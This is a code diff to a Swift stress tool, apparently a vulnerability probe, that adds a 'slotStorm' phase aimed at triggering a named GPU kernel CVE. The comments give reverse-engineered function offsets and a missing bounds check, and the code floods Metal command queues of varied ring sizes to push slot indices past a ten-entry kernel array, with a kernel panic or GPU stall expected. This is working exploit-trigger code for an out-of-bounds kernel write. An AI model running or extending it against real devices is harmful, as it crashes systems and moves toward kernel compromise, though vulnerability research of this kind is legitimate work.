@@ -31,6 +31,7 @@ import os
 final class AGXStress {
 
     enum Phase: String, CaseIterable {
+        case slotStorm    = "slotStorm    (maxCommandBufferCount spread → slot>=10)"
         case eventStorm   = "eventStorm   (signal values 0..63)"
         case bitStorm     = "bitStorm     (signal 1<<k, k=0..31)"
         case maskStorm    = "maskStorm    (signal high-bit masks 0x3FF..0xFFFFFFFF)"
@@ -114,7 +115,7 @@ final class AGXStress {
         lock.lock(); defer { lock.unlock() }
         guard !running else { return }
         running = true
-        phase = .eventStorm
+        phase = .slotStorm
         iterations = 0
         log("=== AGXProbe START (device \(device.name)) ===")
         DispatchQueue.global(qos: .userInitiated).async { [weak self] in
@@ -144,6 +145,7 @@ final class AGXStress {
         while isRunning() && guardCounter < 60_000_000 {
             let p = currentPhase()
             switch p {
+            case .slotStorm:        slotStorm()
             case .eventStorm:       eventStorm()
             case .bitStorm:         bitStorm()
             case .maskStorm:        maskStorm()
@@ -188,6 +190,53 @@ final class AGXStress {
     }
 
     // MARK: - engines
+
+    /// Phase 0 — THE trigger hypothesis for CVE-2026-64747.
+    ///
+    /// Kernel RE (2026-08-10): the vuln slot-fill fn 0x3a8c is fed its count
+    /// from [cmd+0xc4] / [cmd+0xc8] on the command-buffer descriptor with NO
+    /// bounds check (legal slots are bits 0..9; the arrays at obj+0x1040/
+    /// 0x1540 / 0xdc0 / 0x12c0 have 10 entries).  The sister fn 0x3c20 has the
+    /// same unchecked counts; only 0x38e4 (guarded by `orr w8,w2,w1; cmp #0x3ff`)
+    /// is patched.  26.6 fixes both by rejecting (w1|w2) > 0x3ff.
+    ///
+    /// The only userland knob plausibly controlling which slot a command gets
+    /// is the queue's ring size (maxCommandBufferCount).  So: for a spread of
+    /// ring sizes, commit buffers until every slot has been handed out; if the
+    /// driver assigns slot >= 10 (bit >= 10 in the mask) the kernel writes
+    /// 0x40 bytes past the legal array → panic / GPU stall is expected.
+    private func slotStorm() {
+        let counts: [Int] = [11, 12, 16, 24, 32, 64, 128, 256, 512, 1024]
+        for n in counts {
+            guard let q = device.makeCommandQueue(maxCommandBufferCount: n) else { continue }
+            var submitted = 0
+            // commit ~3 ring rotations so slot 10+ (if the ring is that wide)
+            // is reached several times.  Bound the loop defensively.
+            let target = min(n * 3, 1500)
+            for _ in 0..<target {
+                guard let cb = q.makeCommandBuffer() else { break }
+                blitOn(cb, val: UInt32(submitted & 0x3FF))
+                cb.commit()
+                submitted += 1
+                // periodic soft drain so the ring never wedges
+                if submitted % 300 == 0 {
+                    let sem = DispatchSemaphore(value: 0)
+                    let b = q.makeCommandBuffer()
+                    b?.addCompletedHandler { _ in sem.signal() }
+                    b?.commit()
+                    _ = sem.wait(timeout: .now() + 2)
+                }
+            }
+            log("slotStorm: maxCommandBufferCount=\(n) → \(submitted) committed")
+            let sem = DispatchSemaphore(value: 0)
+            let b = q.makeCommandBuffer()
+            b?.addCompletedHandler { _ in sem.signal() }
+            b?.commit()
+            if sem.wait(timeout: .now() + 6) == .timedOut {
+                log("!!! slotStorm max=\(n): GPU STALL")
+            }
+        }
+    }
 
     /// Commit a command buffer that signals `event` to `value`.  FIX: do NOT
     /// encodeWaitForEvent on our own signal — IOGPU posts the shared-event
